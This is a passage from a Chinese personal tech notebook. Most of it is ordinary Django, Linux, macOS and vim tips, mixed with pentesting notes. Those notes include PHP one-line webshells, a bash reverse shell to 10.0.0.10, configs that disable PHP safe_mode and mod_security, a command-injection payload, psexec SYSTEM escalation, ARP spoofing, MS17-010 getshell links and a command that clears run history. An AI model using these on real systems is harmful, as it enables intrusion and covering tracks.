	http://cdwanze.github.io/%E7%94%B5%E8%84%91/python/Django/django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html
	http://7sdream.github.io/django-intro-zh/
	django+python3+mysql
		http://sanbaideng.lofter.com/post/48a4f0_572d2e6
	django使用已经存在的数据库
		https://docs.djangoproject.com/en/1.10/howto/legacy-databases/
	django中template继承方法[extends用法]
		http://blog.csdn.net/xiaobing_blog/article/details/11177887
	django中用了extends后在base.html中的css在其他以base.html为模板的html文件中无法加载css的问题:
		解决方法:在base.html中的css的路径中不要用相对路径,eg:href="static/base.css"改成href="/static/base.css"
		http://stackoverflow.com/questions/27787483/django-template-extends-does-not-call-css
	django禁止没有登录时访问相关页面设置
		https://docs.djangoproject.com/en/1.10/topics/auth/default/#django.contrib.auth.decorators.login_required
		http://stackoverflow.com/questions/28676825/avoid-access-to-other-pages-via-url-if-not-logged-on-django
			in views.py:
				from django.contrib.auth.decorators import login_required
				@login_required
				def index(request):
					...

260.关闭占用的端口
	netstat -ntlp
	kill -9 pid

261.css拷贝神器,一次复制一个div所有样式
	http://stackoverflow.com/questions/4911338/tools-to-selectively-copy-htmlcssjs-from-existing-sites
	https://github.com/kdzwinel/SnappySnippet

	css:
	padding:内边框
	水平居中方法
		http://www.jb51.net/css/12310.html

262.python调试
	import pdb
	pdb.set_trace()

263.wooyun文章
	链接:http://pan.baidu.com/s/1i4ZP8Vj 密码:yybp
	链接:http://pan.baidu.com/s/1mhZJFS0 密码:t20m

264.eval和assert的区别
	http://www.vuln.cn/8395
	http://www.php.net/manual/zh/function.eval.php
	http://php.net/manual/zh/functions.variable-functions.php

265.pip install xxxx -U 提示是最新版本而无法升级时:
	pip install xxx -U --no-cache-dir即可解决

266.gitignore文件
	https://github.com/github/gitignore

267.linux mint安装fcitx
	http://einverne.github.io/post/2015/10/things-to-do-after-install-linux-mint.html
	弃用rime,上面这个就可以用了

268.linux mint 18没有声音解决办法
	https://forums.linuxmint.com/viewtopic.php?t=184577

269.linux字体问题解决不美观
	http://blog.csdn.net/skykingf/article/details/43816435

270.linux mint安装vmware后,win键不按也相当于按下的解决办法:
	由于在linux mint中win+d是回到桌面的快捷键,为了更好使用vim的caps键,在系统中设置将caps键变成如下效果:
		按住caps键时caps键相当于ctrl键,按一下caps键时caps键相当于esc键[这样对vim有很多好处],实现方法是:在
		.zshrc|.bashrc文件中加上:
		setxkbmap -option 'caps:ctrl_modifier' && xcape -e 'Caps_Lock=Escape' &
	也许是由于这样产生了一个问题:导致在虚拟机中ctrl+alt退出到主机[linux mint18]后win键不按下也相当于按下,后来发
	现可以这样解决:
		新建一个自定义快捷键ctrl+空格,对应执行系统命令为setxkbmap,这样从虚拟机中ctrl+alt退出到主机后:
		d:到桌面[这时win键还是不听话的]
		caps+空格[按下这个组合比较简单,这里caps由于上面设置了,相当于ctrl+空格,然后win键就会听话了,原因是只要重
		新运行下setxkbmap这个程序,win键就突然听话了]

271.psexec从administrator权限获取system权限:
	psexec.exe -s cmd.exe
	psexec.exe \\xxx -s cmd.exe

272.在线markdown简历制作
	http://deercv.com/

273.虚拟机忘记密码解决方法:eg.xp:
	1.setting
	2.mount
	3.c:/WINDOWS/system32/config/sam
		如果删除了上面路径的sam可以到c:/WINDOWS/repaire目录下有个备份的sam
	4.http://www.uzzf.com/soft/59037.html这里面的工具打开sam并清空密码

274.makefile文件怎么编译
	http://www.cnblogs.com/BambooEatPanda/p/4994298.html
	terminal:make

275.install l2tp-ipsec-vpn on linux mint 18
	1)从下面的url中下载l2tp-ipsec-vpn.deb包
	http://www.ubuntuupdates.org/package/core/trusty/universe/base/l2tp-ipsec-vpn
	2)如果安装上面的deb提示依赖l2tp-ipsec-vpn-daemon则从下面的链接中安装daemon的deb包
	https://packages.debian.org/wheezy/amd64/l2tp-ipsec-vpn-daemon/download
	3)除了上面2个结合的步骤,下面是可参考的另一种方法
	https://sourceforge.net/projects/l2tp-ipsec-vpn/files/

276.iphone手动换电池时胶带拉断了处理情况:
	(电池上一共有2根胶带,其中一根拉断了,另一根完全拉出)
	将电池尾部的黑色胶用东西弄破,尾部的东西可以用力拉,可以将电池相对拉起一点点
	吹热没有拆下的电池,由于已经有一根电池上的胶带拉断了,现在慢慢从已经拉出胶带的那一侧慢慢qiao起,要花一些时间
	不要急,当电池可以被qiao起成一定角度后(eg.5-10度)用比较细的起子从qiao起那边的电池方向伸进去,用起子将电池下面
	的电池皮和白色胶带连接处chuo烂,沿着电池身的长边将这些粘连处都chuo烂,最终可将电池拿出.

277.使用mona时,由于immunity debugger是32位的(目前没有64位),如果immunity debugger安装在64位的系统上,需要安装32位
    的python才可以使用immumnity debugger的mona插件,否则会报load dll failed错误

278.windows命令行查看操作系统情况:
	systeminfo | find "Windows" && systeminfo | find "based"

279.java设置jvm内存大小:
	java -jar -Xmx2048M  /your_burpsuite_path/burpsuite.jar
	java -jar -Xmx2G  /your_burpsuite_path/burpsuite.jar
	可用于binnavi时设置内存大小

280.好用的音乐外链获取:
	1)http://www.170mv.com/tool/song/
    获取到的链接会几天后失效
	2)工具法:
        a)转换工具:http://pan.baidu.com/s/1pKUpsaZ
          结合酷狗播放器可得外链,获取到的链接会几天后失效
        b)https://github.com/yangyangwithgnu/yosong

281.小生我怕怕在线破解工具包
	http://down.52pojie.cn/
    还有52pojie专用虚拟机

282.修改3xp10it.cc代码区的字体为画出的文泉驿等宽正黑的关键在于修改_includes/footer.html中添加的code标签设置为
    重新用文泉驿等宽正黑draw,也即下面的code标签的设置
	$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body",
		"354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
	$youziku.draw(); 

283.微软新防护手段:
    emet:
        EMET是微软推出的一款漏洞防护软件,专门针对应用程序的未知漏洞进行防护,能够使大多数漏洞攻击手段失效
    隔离堆和延迟释放:
        从2014年6月起,微软在IE浏览器中引入了两项新的安全机制:隔离堆和延迟释放,这两项机制使得能够在IE浏览器上
        成功运行的UAF漏洞(释放后重 用)变得非常稀有,而此前在IE浏览器上很容易挖掘到可以利用的UAF漏洞.在国内外
        各大安全会议上,目前还没有人提出完美攻破上述安全机制的技术思路.
    cfg:
        http://www.powerofcommunity.net/poc2014/mj0011.pdf
        http://blog.trendmicro.com/trendlabs-security-intelligence/exploring-control-flow-guard-in-windows-10/
        下面的链接中是一个cfg绕过
        https://www.coresecurity.com/blog/exploiting-cve-2015-0311-part-ii-bypassing-control-flow-guard-on-windows-8-1-update-3
        CFG(执行流保护),微软在Win 8.1 Update 3以及Win 10中启用了一种抵御内存泄露攻击的新机制,
        即Control Flow Guard(CFG)——控制流防护.这项技术是为了弥补此前不完美的保护机制,例如地址空间布局随机化
        (ASLR)导致了堆喷射的发展,而数据执行保护(DEP)造成了漏洞利用代码中返回导向编程(ROP)技术的发展.

    pie:
        linux下的安全机制,dep+aslr没开pie的情况下可利用return2plt绕过aslr

284.windows安装openvpn
    1>不要将安装文件命名为openvpn.exe,否则会无法继续安装,会提示有一个实例正在运行
    win2003安装openvpn:
    http://www.he11oworld.com/system/2314.html
    attention:
    a)上面链接中说的服务器端上的ip写内网ip,实际上操作时发现0.0.0.0或者vps的公网ip才可以
    b)udp->tcp更好
    c)客户端改变配置文件后不起作用时,要在open vpn gui运行后右键修改配置文件,并从这里修改才有效
    d)如果发现配置文件还是没有修改后的效果,要重启客户端,再重新连接
    e)最好在ubuntu上安装openvpn服务,win03上暂时没成功

285.ubuntu安装openvpn
    https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-14-04
    attention:
    客户端是ubuntu时,默认的本机dns(/etc/resolv.conf)是127.0.1.0,要改,eg.8.8.8.8+8.8.4.4,原因猜想:虽然在vps上的
    openvpn服务端配置文件中设置了dns,但是有可能客户端只用本机系统的dns,不用openvpn服务端上设置的dns
    最后的记录是在windowns 2003上搭建openvpn服务器失败,在ubuntu上成功
    要想让多个客户端使用同一个客户端配置文件,要在server上的配置文件中的duplicate-cn取消注释,client-to-client最
    好也取消注释
    在服务器上重启openvpn命令:service openvpn restart

286.python中socket.gethostbyname_ex在没有网络连接的情况下无法工作,会出错

287.有些编辑器会在utf8文件开头加上bom(eg.notepad),而如python等编译器不会自动处理这个bom,手动删除bom方法:vim打
    开后:set nobomb

288.<?php @eval($_POST[0day]);?>这个一句话的密码不是0day,这样的语法是错的,php中不加引号的变量不能以数字开头,
    以后写一句话最好加双引号或单引号,否则不能用数字开关的密码

289.EdrawSoft Edraw Max画图工具,听说不错

290.xss平台搭建:http://www.bodkin.ren/?p=133

291.命令执行漏洞fuzz可用payload:
    set /a 654321 * 789 && expr 654321 \* 789 || echo
    输出:516259269
    适用:windows+linux

292.Corelan ROPdb[基于单个dll收集通用rop链]
    https://www.corelan.be/index.php/security/corelan-ropdb/    

293.数据库中空白字符
    SQLite3 0A 0D 0C 09 20 
    MySQL5 09 0A 0B 0C 0D A0 20 
    PosgresSQL 0A 0D 0C 09 20 
    Oracle 11g 00 0A 0D 0C 09 20 
    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20

294.ubuntu查看本机glibc版本:
    a)ldd --version
    b)/lib/x86_64-linux-gnu/libc.so.6

    glibc是什么?

    glibc是GNU发布的libc库,即c运行库.glibc是linux系统中最底层的api,几乎其它任何运行库都会依赖于glibc.glibc除了
    封装linux操作系统所提供的系统服务外,它本身也提供了许多其它一些必要功能服务的实现.由于 glibc 囊括了几乎所有
    的 UNIX 通行的标准,可以想见其内容包罗万象.而就像其他的 UNIX 系统一样,其内含的档案群分散于系统的树状目录结构
    中,像一个支架一般撑起整个操作系统.在 GNU/Linux 系统中,其C函式库发展史点出了GNU/Linux 演进的几个重要里程碑,
    用glibc 作为系统的C函式库,是GNU/Linux演进的一个重要里程碑.

    glibc除了封装linux操作系统所提供的系统服务外,它本身也提供了许多其它一些必要功能服务的实现,主要的如下:
    (1)string,字符串处理
    (2)signal,信号处理
    (3)dlfcn,管理共享库的动态加载
    (4)direct,文件目录操作
    (5)elf,共享库的动态加载器,也即interpreter
    (6)iconv,不同字符集的编码转换
    (7)inet,socket接口的实现
    (8)intl,国际化,也即gettext的实现
    (9)io
    (10)linuxthreads
    (11)locale,本地化
    (12)login,虚拟终端设备的管理,及系统的安全访问
    (13)malloc,动态内存的分配与管理
    (14)nis
    (15)stdlib,其它基本功能

295.猜密码网站
    http://www.caimima.net/

296.sql注入时如果sql语句中不能有"_"下划线注入方法:
    https://forum.90sec.org/forum.php?mod=viewthread&tid=10223

297.字典收集网站
http://weakpass.com/    

298.网络故障追查命令
linux:
    traceroute www.baidu.com
windows:
    tracert www.baidu.com

299.已经失效的网页链接要查处内容方法:
    https://archive.org/

300.伪造ip:
    HTTP_CLIENT_IP
    HTTP_X_FORWARDED_FOR
    REMOTE_ADDR

301.绕过安全模式
    https://www.youtube.com/watch?v=Ja9Z-jG3qLA
        http://pastebin.com/08awe0zc
        content:

        php.ini:
            
        safe_mode = OFF
        Safe_mode_gid = OFF
        disable_functions = NONE
        disable_classes = NONE
        open_basedir = OFF
        suhosin.executor.func.blacklist = NONE

        .htaccess:

        <IfModule mod_security.c>
        SecFilterEngine Off
        SecFilterScanPOST Off
        SecFilterCheckURLEncoding Off
        SecFilterCheckCookieFormat Off
        SecFilterCheckUnicodeEncoding Off
        SecFilterNormalizeCookies Off
        </IfModule>
        <Limit GET POST>
        order deny,allow
        deny from all
        allow from all
        </Limit>
        <Limit PUT DELETE>
        order deny,allow
        deny from all
        </Limit>
        SetEnv PHPRC 这里要设置相应目录/php.ini

302.ubuntu下好用的下载工具
    http://os.51cto.com/art/201508/489638_all.htm

303.在线免登录流程图绘制
    https://www.draw.io/

304.匿名邮箱
    https://www.zhihu.com/question/23418181

305.轻易翻墙
    http://www.ashiktricks.com/best-proxy-servers-list/

306.python的argv:
    2.py内容:
    import os
    os.system("python3 3.py 1 2 3 4")

    3.py内容:
    import sys
    print(sys.argv[2])

    terminal:
    python3 2.py 9 8 7 6
    output:2

    python3 3.py 1 2 3 5 
    output:2

307.用.htaccess和.htpasswd给目录加密码保护:
    .htpasswd放在要保护访问的目录(eg./admin)下,内容如:
    admin:$apr1$kvlL12qf$qIJF05NVkACwYYa728udA/
    [上面密码为123456],可在这里生成:http://www.htaccesstools.com/htpasswd-generator/

    .htaccess添加如下内容:
    AuthType Basic
    AuthName "My Protected Area"
    AuthUserFile /path/to/.htpasswd
    Require valid-user

    建议将密码文件命名为.htpasswd是因为apache对.ht*文件有访问保护,一般用户没有权限访问它的内容
    .htpasswd中密码的加密方式在win下一般为md5,在linux下一般为一个系统函数调用crypt(),上面生成的是在
    http://www.htaccesstools.com/htpasswd-generator/这里说的用md5算法生成的密码,适用于win和linux,看起来不是直
    接的md5,kali下的hash-identifier识别结果为:
    Possible Hashs:
    [+]  MD5(APR)
    www.cmd5.com无法识别,不能爆破,john可如下爆破:
    john -wordlist=wordlist.txt hash.txt
    其中hash.txt存放内容为$apr1$kvlL12qf$qIJF05NVkACwYYa728udA/
    hashcat的破解命令暂时没找到

    bypass目录限制访问方法:
    https://www.youtube.com/watch?v=CZXt_Q7BjxQ
    https://www.youtube.com/watch?v=yZ-WxIZIoQw

    如果在.htaccess中只配置成307中的结合.htaccess和.htpasswd的方法来限制目录访问应该不能绕过,如果在.htaccess中
    还配置了其他如<limit>设置内容有可能可以绕过,如上面的youtube中的视频所示

308.linux mint18安装medusa过程遇到ssh.mod无法使用解决
    http://www.bugbank.cn/toolwiki/detail/5801d7306cb22850626b9f7e.html

309.数据库连接管理工具,可内网代理下本地用
    http://www.moonsec.com/post-322.html

310.好用的日记平台
    https://750words.com/

311.dot画图官网:
    https://casatwy.com/shi-yong-dotyu-yan-he-graphvizhui-tu-fan-yi.html
    http://www.graphviz.org
    http://hustlijian.github.io/tutorial/2015/05/29/graphviz-learn.html

    dot hello.dot -T png -o hello.png
    完整的命令为:
    ＜cmd＞ ＜inputfile＞ -T ＜format＞ -o ＜outputfile＞
    其中graphviz 的＜cmd＞ 有好几种,每种使用方法都完全相同,差别只在于渲染出来的图片效果不一样.man中的简介是这样的:
    <cmd> 	介绍
    dot 	渲染的图具有明确方向性.
    neato 	渲染的图缺乏方向性.
    twopi 	渲染的图采用放射性布局.
    circo 	渲染的图采用环型布局.[可画出水平方向箭头,另外用rankdir=LR也可以画出水平布局]
    fdp 	渲染的图缺乏方向性.
    sfdp 	渲染大型的图,图片缺乏方向性.

    tricks:
    a)画相反的箭头:a->b[dir="back"]
    b)画水平布局:rankdir="LR"
    c)下面链接工具可以组合多个png到一个png,生成的时候用macOS的系统截图出来图片质量高
        http://www.fotor.com/app.html#!module/collage/tool/PhotoStitching

312.tar.xz解压方法:
    tar -xvJf *.tar.xz

313.SNMP:简单网络管理协议,入侵SNMP后可以看到目标机器运行了什么软件,以及目标机器的网卡情况,msf中有相关模块
    LDAP:轻量型目录访问协议,http://zqdevres.qiniucdn.com/data/20071016120254/index.html

314.C&C服务器:用来隐蔽控制肉鸡执行命令的服务器,可以是vps,可以是twitter,可以是smtp服务器

315.macOS无法使用crontab解决方法:
    macOS一般不建议再用crontab来开计划任务,官方推荐使用
    http://stackoverflow.com/questions/15395479/why-ive-got-no-crontab-entry-on-os-x-when-using-vim
    launchctl做法:
    http://honglu.me/2014/09/20/OSX%E7%B3%BB%E7%BB%9F%E6%B7%BB%E5%8A%A0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/

316.Linux系统下用smbclient命令来访问Windows共享

317.linux下端口转发工具tgcd,用于穿透防火墙
    http://tgcd.sourceforge.net/

318.socat,加强版netcat
    http://brieflyx.me/2015/linux-tools/socat-introduction/

319.python 虚拟环境[virtualenv/virtualenvwrapper]设置
    http://www.jianshu.com/p/44ab75fbaef2

320.angr学习资料库:
    https://github.com/a7vinx/angr-doc-zh_CN
    google translate:http://angr.io/api-doc/
    google translate:https://docs.angr.io/
    http://ysc21.github.io/blog/2016-01-28-angr-script.html
    http://ysc21.github.io/blog/2016-02-06-doc-path-group.html
    http://ysc21.github.io/blog/2016-02-20-param-path-group.html#save-unconstrained
    http://ysc21.github.io/blog/2016-04-03-doc-path-step.html

    angr解题:
    http://bestwing.me/2017/03/08/angr-study/
    http://blog.csdn.net/cosmopolitanme/article/details/73284074

    解题必读:
    http://www.freebuf.com/articles/web/150296.html

321.python中下划线:
    用单下划线(_)开头表示模块变量或函数是protected的(使用import * from时不会包含).
    用双下划线(__)开头的实例变量或方法表示类内私有.

322.在安装原生的MongoDB时,默认条件下,MongoDB是不启用认证和访问控制功能,说白了就是MongoDB不会提示你设置账户密
    码,也不会提示你任何ip都能访问你的数据库

323.快速以管理员身份打开cmd:
    a)
    win+r
    runas /user:administrator cmd
    b)
    powershell Start-Process cmd -Verb runAs

324.清除运行过的命令列表:
    powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    -Name '*' -ErrorAction SilentlyContinue"

325.macOS下的pfctl功能类似于linux下的iptables

326.~/.shici.md,~/.jiangcheng.md,~/.plan.md

327.浏览器开源fuzz框架:
    Grinder
    Fileja
    funfzz
    morph
    nduja
    浏览器漏洞挖掘学习:
    一个最简单的Fuzz框架,一行代码,启动调试器打开样本生成器网页:
    windbg -c "!py chrome_dbg_test.py" -o "C:\Program Files\Google\Chrome\Application\chrome.exe --js-flags="--expose-gc" --no-sandbox --disable-seccomp-sandbox --allow-file-access-from-files --force-renderer-accessibility http://127.0.0.1/fuzzer.php
    解释上面的命令:
    使用windbg调试启动chrome打开样本生成器http://127.0.0.1/fuzzer.php
    http://127.0.0.1/fuzzer.php生成测试样本并切换样本.
    一个最简单调试器,十几行代码,pydbg 是 windbg 的一个插件,使用它可以编程控制 windbg.
    比如用这段代码,监控调试进程产生的调试事件:
    while True:
    exc = e(".lastevent")
    print exc
    if exc.find("Exit process") > 0:
    os.system("taskkill /F /IM windbg.exe")
    观察windbg收到的调试事件,如果是退出进程事件,那么把windbg退出(同时chrome进程也退出了).同理,如果windbg收到的调试事件是读写内存异常,那就是一个有效崩溃.
    这时候你只需要执行windbg命令r,k,把结果传回服务器就完成了一个崩溃信息的收集了.
    要想挖掘浏览器漏洞,推荐大家去分析以往浏览器的漏洞,收集一些POC,这样能更好地理解浏览器漏洞形成的原因以及调试分析方法.
    所以我们的目标是怎样去生成有效的、复杂的、测试用例,让浏览器崩溃.
    我们需要去构建 fuzz 生成算法用的字典,通常可以写爬虫到 MSDN、MDN、W3C 去抓取,还有可以用 IDA 分析 mshtml 找隐藏的属性键值,还可以看浏览器源码的头文件.我们需要去构建全面的字典,去覆盖浏览器的各个特性

    moreDetail:
    http://www.2cto.com/article/201612/580534.html

328.域名后缀大全
    http://www.iana.org/domains/root/db
    https://www.v2ex.com/t/119239

329.dmz是针对wlan网口而言的.eg:
    一个路由器有wlan和lan口,其中wlan口是上网的外接口,lan口是内网的接口,此路由器wlan口的ip为192.168.1.111(对应网
    关ip是192.168.1.1),lan口的ip为192.168.0.1,lan口没有对应网关,lan口自己所在ip就是对应内网的网关,那么在该路由器
    上设置dmz为192.168.0.120后,所有对192.168.1.111的端口的访问将被转移到对192.168.0.120对应的相同端口的访问,
    eg.ssh 192.168.1.111其实是连接192.168.0.120的ssh的效果,不管192.168.1.111有没有开ssh服务,只要
    192.168.0.120开了ssh服务就能成功开始ssh对话,如果帐号口令正确就会成功登录到192.168.0.120的ssh服务.如果尝试
    ssh 192.168.0.1这样是无法开始ssh对话的,因为dmz是对wlan口而言的,ssh 192.168.0.1将访问路由器的ssh服务端口,如
    果路由器的lan口(192.168.0.1)没有开ssh服务则不能连接成功.路由器的wlan口和lan口是两块网卡对应的两个不同ip,每个
    ip对应的开放的端口没有对应关系,是各自独立的.

    也即:dmz是一个网卡所在ip的所有端口数据到另外一个网卡所在ip的内网的另一台机器(ip)的流量转发

    一般有固定电话的地方可以分到一个公网ip,如果人所在的路由器附近没有固定电话,那么人则不可以通过在该路由器上设
    置公网ip的dmz为该路由器下的某台机器的ip,因为人在这个路由器上设置的dmz是对路由器的wlan口的ip设置的,但是这个
    wlan口并没有公网ip,因为没有固定电话(拨号得ip),有可能在人所在的小区的网络设备中有一个固定的电话,而人与其他邻
    居共用这个小区的那台固定电话拨号得到的公网ip,要想让人所在的路由器下的自己的电脑可以用公网ip访问到,需要到小
    区网络设备(小区路由器)中设置dmz为人的家里的路由器的ip,然后再在人的家里的路由器上设置dmz为人的电脑的ip,这样
    才可以由公网ip访问到人的家里的在家里路由器下的内网下的电脑的ip.或者设置端口转发也可

330.burpsuite为android app的https流量代理:
        http://www.jb51.net/article/64396.htm
    burpsuite为ios app的https流量代理:
        http://www.tuicool.com/articles/emIfea
        http://danqingdani.blog.163.com/blog/static/1860941952012112353515306/

331.HOOK原理:
    http://blog.csdn.net/on_1y/article/details/7595184

332.心脏滴血(openssl)漏洞检测:
    https://github.com/vs4vijay/exploits
        nmap -sV -p ??? --script=ssl-heartbleed 192.168.1.1

333.查看乌云完整文章方法
    https://web.archive.org/web/20160719120927/http://drops.wooyun.org
    找到对应想看的文章后在http://cb.drops.wiki/里面搜[因为上面的链接是最全的,但是文章里面的图片不一定会显示,但
    是这个新乌云里面的文章都有图片,二者结合可得原貌]

334.php的unserialize函数漏洞理解
    http://www.91ri.org/3960.html
    http://www.cnblogs.com/LittleHann/p/4242535.html    (cool)

335.macOS自带apache路径
    http://blog.csdn.net/seafishyls/article/details/44546809

336.最简单的webshell
    <?=`$_GET[1]`?>
    reverse shell
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");?>

    最全的关于webshell隐藏的文章
    http://www.cnblogs.com/LittleHann/p/3522990.html

337.waf绕过小结
    https://www.peerlyst.com/posts/list-of-waf-security-bypass-research-karl-m-1

338.文件上传技巧
    https://xianzhi.aliyun.com/forum/read/458.html

339.域名欺骗
    http://bobao.360.cn/learning/detail/3736.html

340.logmein支持不同内网间直接ssh登录,用logmein hamachi加入或创建网络即可,天联vpn效果更好,因为服务器在国内

341.php的webshell检测工具可参考
    https://github.com/cfc4n/pecker

342.windows原装纯净系统下载
    http://www.cnblogs.com/pwenlee/p/4180137.html

343.macbook pro安装win7虚拟机时选择的系统要是msdn原装系统,否则会报没有dvd驱动程序的错误

344.ms17-010利用方法
    单独检测可msf或https://github.com/RiskSense-Ops/MS17-010
    getshell参考:
    https://3gstudent.github.io/3gstudent.github.io/内网安全-利用NSA-Smbtouch批量检测内网/
    或
    https://www.youtube.com/watch?v=4OHLor9VaRI
    或
    https://forum.90sec.org/forum.php?mod=viewthread&tid=10462&highlight=nsa
    https://forum.90sec.org/forum.php?mod=viewthread&tid=10450&extra=page=1
    https://forum.90sec.org/forum.php?mod=viewthread&tid=10451&extra=page=1
    https://forum.90sec.org/forum.php?mod=viewthread&tid=10452&extra=page=1
    <x86一次成功后失败了-->本机换ip,换eternalblue和double...之外的模块,本地给x86测试看看有什么方案>
    <用msf版本:
    bind对方80/443端口,如果bind_tcp不行则用bind_http,再不行则用反弹shell,payload用reverse_http

345.macOS下快速切换用户方法
    https://apple.stackexchange.com/questions/38390/is-there-a-shortcut-which-invokes-the-login-window-fast-user-switching-comm
    最后用的是:
    在keyboard maestro中添加一个快捷键(ctrl+shift+l)触发一个shell脚本,内容如下:
    /System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend

346.在线修改图片大小
    http://www.gaitubao.com/

347.ssh作为socket代理的简单方法
    http://daxiawj.github.io/2015/01-14-SSH%E4%BD%9C%E4%B8%BASocks%E4%BB%A3%E7%90%86%E7%9A%84%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95.html

348.msf自动化命令脚本使用方法
    https://www.t00ls.net/thread-39687-1-1.html

249.firefox离线安装插件
    http://www.jb51.net/softjc/385186.html

250.一款好用的端口转发工具
    http://rootkiter.com/EarthWorm/

251.macOS下硬盘中文件变灰解决办法
    xattr -l 文件
    xattr -d com.apple.FinderInfo 文件

252.ettercap用法
    ettercap -T -i eth0 -M arp:remote /192.168.0.1// /192.168.0.102//

    ettercap+ferret+hamaster
    http://www.hackingarticles.in/session-hijacking-using-ettercap-hamster-and-ferret-a-beginner-guide/

253.从源码安装Python3报错解决方案:
    在./configure之前执行:
    export LANG=zh_CN.UTF-8
    export LANGUAGE=zh_CN.UTF-8
    https://segmentfault.com/q/1010000004400019/a-1020000004425795

254.MacVim自动切换中文英文输入法方案
    http://dequn.github.io/2016/10/28/macvim-auto-im/
    https://boyux.com/2014/02/15/vim-中英文输入切换/
    https://code.google.com/archive/p/vimim/downloads   vimim的词库
    https://github.com/rime/home/issues/157#issuecomment-302615226

255.tmux重启
    tmux kill-server

256.burpsuite设置代理为pac文件
    https://github.com/vincd/burpproxypacextension

257.python调试利器
    pudb
        pudb3 1.py
    https://documen.tician.de/pudb/starting.html

258.最简单的百度云限速破解                
    1).用chrome设置用手机打开对应下载页面后下载,然后打开chrome的下载页面,复制下载链接用迅雷下载即可,如果不行则将要
    下载的文件放到一个文件夹,同样用chrome的手机模式下载文件夹后获取下载地址再用迅雷下载,但是这个不能下载大文件
    2).比上面更好的是用chrome下rome的手机模式下载文件夹后获取下载tampermonkey插件,然后再用上面的方法下载,可下载大文件,如果发现获得下载链接后用
    迅雷下载速度也受限,这是因为这个得到的下载地址里面带有用户信息,需要在百度网盘里将这个文件分享后退出登录再重
    新在安装了tampermonkey的情况下用chrome的手机模式下载以获得下载链接,这个链接是不带用户信息的(因为退出了登录),
    这时再用迅雷下载就不会限速了.

    update:
    百度网盘加速下载
    https://zhuanlan.zhihu.com/p/33704392


259.macOS下的好用的虚拟机
    paralles desktop

260.一次正则得到结果的方法
    一次正则得到结果,最后如下:pip3 show exp10it | grep -oP '(?<=Location: ).*'
    不过macOS下的grep不支持Perl风格的正则,没有-P表示的Perl正则功能,不支持前向匹配,其他linux下可以这么用.另外
    egrep(相当于grep -E)用的是扩展的正则模式匹配,扩展的正则模式不支持捕获,所以macOS下要一次用grep得到结果应该是不
    行的,有人推荐用ack.
    link:       
    http://www.cnblogs.com/v394435982/p/5165860.html
    https://superuser.com/questions/639295/is-negative-look-behind-supported-in-osx-grep


    grep -E  ===  egrep
    结论:
    1.非macOS下的linux用grep则用-P选项表示Perl风格的正则
    2.macOS下的grep不好用,直接用ack

261.cookie中的HttpOnly属性的功能是限制js访问cookie

262.openssl根据私钥解密命令
    openssl rsautl -decrypt -in key.txt -inkey test.key -out 1.txt

263.多线程或是多进程中的join函数的功能将调用join函数的线程或是进程进入"阻塞模式"(这个阻塞模式是相对于线程或主进程
的),也即如果某个线程或进程调用了join函数,那么不运行完这个线程或进程的话,整个程序的执行流程就不会再进入到主线程中
,也即主线程被阻塞.

264.macOS启动与关闭ssh服务
    launchctl load -w /System/Library/LaunchDaemons/ssh.plist
    launchctl unload -w /System/Library/LaunchDaemons/ssh.plist
    
    macOS允许root以ssh登录方法:
    将/etc/ssh/sshd_config中的PermitRootLogin prohibit-password改成PermitRootLogin yes,并按上面2个命令重启ssh服务

265.ssh中文乱码解决方法
    http://blog.csdn.net/winter13292/article/details/8362834
    my:
    本地和ssh服务端都在.zshrc中设置(如果不重启要记得source ~/.zshrc)
    export LC_ALL=zh_CN.UTF-8
    export LANG=zh_CN.UTF-8

266.macOS破解工具
    hopper(或许ida pro for mac更好,淘宝有180元的[无f5功能])破解版下载
    http://www.sdifen.com/hopperdisassembler408.html

267.16进制转字符
    http://www.bejson.com/convert/ox2str/

268.mysql(mariadb)无法修改root的密码解决方法:
    https://superuser.com/questions/949496/cant-reset-mysql-mariadb-root-password

269.https校验理解
    http://www.evil0x.com/posts/26569.html
    http://www.tuicool.com/articles/BnInUvy
    http://www.cnblogs.com/by-3ks/articles/4113849.html
    以上小结:
    https的校验需要在客户端中存放服务器上的真实公钥,在每次https的通信时直接由客户端存放的公钥来解密https数据,如果
    解密失败则校验不成功,中断连接.

270.css有多个class时,如果不同class中有相同属性,那么后出现的class优先级更高,这时的"后出现"指的是在css文件中出现的
    位置,而不是html中出现的位置

271.大端 小端 大尾 小尾
    http://blog.csdn.net/chy555chy/article/details/51966160

272.查看php的zval信息
    安装xdebug,用xdebug_debug_zval打印zval信息
        http://www.cnblogs.com/ohmygirl/p/internal-variable-1.html

273.cookie,session失效时间
    http://jun1986.iteye.com/blog/1216974
    session在下列情况下被删除
        a.程序调用HttpSession.invalidate();或
        b.距离上一次收到客户端发送的session id时间间隔超过了session的超时设置;或
        c.服务器进程被停止(非持久session) 

274.office 2016 for mac
    http://www.pc6.com/mac/141705.html

275.php中的zval打印
    http://blog.csdn.net/ohmygirl/article/details/41542445
    gdb调试php
       https://github.com/php/php-src/blob/master/.gdbinit 

276.java hello world
    http://blog.csdn.net/haifengid/article/details/52516317 

277.macOS下取消关机
    http://blog.csdn.net/rct1985/article/details/9064211
    my better way:pkill shutdown

278.latex在线公式编辑
    http://zh.numberempire.com/texequationeditor/equationeditor.php

279.vim静态代码语法检查插件
    https://github.com/vim-syntastic/syntastic
    1.vimrc中加Plugin 'vim-syntastic/syntastic'(如果是python3需要设置python的解释器为py3,可直接用备份的.vimrc)
    2.:BundleInstall
    3.pip3 install flake8 && pip install flake8

    update:
    https://github.com/w0rp/ale
    ale比syntastic更好,不过ale需要vim8以上
    ale中使用的flake8检查python代码语法时可配置flake8:
        http://flake8.pycqa.org/en/latest/user/configuration.html
        eg,配置文件可设置每行最大长度,忽略某类错误提示等功能

280.ios越狱开发平台搭建
